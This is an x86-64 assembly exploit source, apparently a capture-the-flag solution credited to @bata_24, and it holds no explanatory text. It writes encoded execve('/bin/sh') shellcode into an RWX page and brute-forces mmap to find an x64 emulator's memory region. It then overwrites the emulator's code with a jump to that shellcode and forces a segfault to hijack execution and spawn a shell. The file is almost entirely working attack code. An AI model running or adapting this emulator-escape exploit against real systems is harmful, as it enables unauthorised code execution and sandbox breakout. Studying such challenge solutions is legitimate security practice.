; thanks to @bata_24

BITS 64
ORG 0

SIZE1 equ 0x60000000
SIZE2 equ 0x4000000
SIZE3 equ 0x400000
SIZE4 equ 0x40000
SIZE5 equ 0x1000

main:
  ; mmap(0xdead0000, 0x1000, RWX, ...)
  xor r9d, r9d
  mov r8d, -1
  mov r10d, 0x32
  mov edx, 7
  mov esi, 0x1000
  mov rdi, 0xdead0000
  mov eax, 9
  syscall

  ; store shellcode (execve binsh)
  mov rax, 0xdead0000
  mov rbx, 0x91969dd1bb48c031
  mov [rax], rbx
  add rax, 8
  mov rbx, 0x53dbf748ff978cd0 ; sh
  ;mov rbx, 0x53dbf748ff8c93d0 ; ls
  mov [rax], rbx
  add rax, 8
  mov rbx, 0xb05e545752995f54
  mov [rax], rbx
  add rax, 8
  mov rbx, 0x050f3b
  mov [rax], rbx

  mov r15, 0x00555500000000 ; brute force start addr

; search x64-emulator address -------------------------- start
MmapLoop1:
  xor r9d, r9d
  mov r8d, -1
  mov r10d, 0x4022; MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE
  mov edx, 3
  mov rsi, SIZE1
  mov rdi, r15
  mov eax, 9
  syscall
  test eax, eax
  js MapFound1

  mov rdi, r15
  call DumpReg

  mov rsi, SIZE1
  mov rdi, r15
  mov eax, 11
  syscall

  mov rsi, SIZE1
  add r15, rsi
  jmp MmapLoop1

MapFound1:
  call MapError

MmapLoop2:
  xor r9d, r9d
  mov r8d, -1
  mov r10d, 0x4022 
  mov edx, 3
  mov rsi, SIZE2
  mov rdi, r15
  mov eax, 9
  syscall
  test eax, eax
  js MapFound2

  mov rdi, r15
  call DumpReg

  mov rsi, SIZE2
  mov rdi, r15
  mov eax, 11
  syscall

  mov rsi, SIZE2
  add r15, rsi
  jmp MmapLoop2

MapFound2:
  call MapError

MmapLoop3:
  xor r9d, r9d
  mov r8d, -1
  mov r10d, 0x4022
  mov edx, 3
  mov rsi, SIZE3
  mov rdi, r15
  mov eax, 9
  syscall
  test eax, eax
  js MapFound3

  mov rdi, r15
  call DumpReg

  mov rsi, SIZE3
  mov rdi, r15
  mov eax, 11
  syscall

  mov rsi, SIZE3
  add r15, rsi
  jmp MmapLoop3

MapFound3:
  call MapError

MmapLoop4:
  xor r9d, r9d
  mov r8d, -1
  mov r10d, 0x4022
  mov edx, 3
  mov rsi, SIZE4
  mov rdi, r15
  mov eax, 9
  syscall
  test eax, eax
  js MapFound4

  mov rdi, r15
  call DumpReg

  mov rsi, SIZE4
  mov rdi, r15
  mov eax, 11
  syscall

  mov rsi, SIZE4
  add r15, rsi
  jmp MmapLoop4

MapFound4:
  call MapError

MmapLoop5:
  xor r9d, r9d
  mov r8d, -1
  mov r10d, 0x4022
  mov edx, 3
  mov rsi, SIZE5
  mov rdi, r15
  mov eax, 9
  syscall
  test eax, eax
  js MapFound5

  mov rdi, r15
  call DumpReg

  mov rsi, SIZE5
  mov rdi, r15
  mov eax, 11
  syscall

  mov rsi, SIZE5
  add r15, rsi
  jmp MmapLoop5
; search x64-emulator address -------------------------- end

; map into x64-emulator
MapFound5:
  mov edx, 12
  mov esi, msgFound
  mov edi, 1
  mov eax, 1
  syscall

  add r15, 0x2000

  xor r9d, r9d
  mov r8d, -1
  mov r10d, 0x32
  mov edx, 7
  mov rsi, 0x1000
  mov rdi, r15
  mov eax, 9
  syscall

Overwrite:
  lea rax, [r15 + 0x124]
  mov rbx, 0xe0ffdead0000b8
  mov [rax], rbx

SEGV:
  mov rax, 0x1000
  mov rax, [rax]

InfLoop:
  jmp InfLoop

DumpReg: ; Dump RDI
  push rbx
  push rcx
  push rax
  push rdi
  push rsi
  push rdx
  mov rbx, 0xdead0800
  mov rcx, 60
DumpRegLoop:
  mov rax, rdi
  shr rax, cl
  and rax, 0xf
  cmp rax, 0x9
  jle DumpRegLow
  jmp DumpRegHigh
DumpRegLow:
  add rax, 0x30
  jmp DumpRegStore
DumpRegHigh:
  add rax, 0x61-10
  jmp DumpRegStore
DumpRegStore:
  mov byte [rbx], al
  add rbx, 1
  cmp cl, 0
  jz DumpRegDone
  sub cl, 4
  jmp DumpRegLoop
DumpRegDone:
  mov byte [rbx], 0x0a
  mov rdx, 17
  mov rsi, 0xdead0800
  mov rdi, 1
  mov eax, 1
  syscall
  pop rdx
  pop rsi
  pop rdi
  pop rax
  pop rcx
  pop rbx
  ret

MapError:
  push rdx
  push rsi
  push rdi
  push rax
  mov edx, 13
  mov esi, msgError
  mov edi, 1
  mov eax, 1
  syscall
  pop rax
  pop rdi
  pop rsi
  pop rdx
  ret

msgError: db "mmap failed!", 0x0A
msgFound: db "area found!", 0x0A
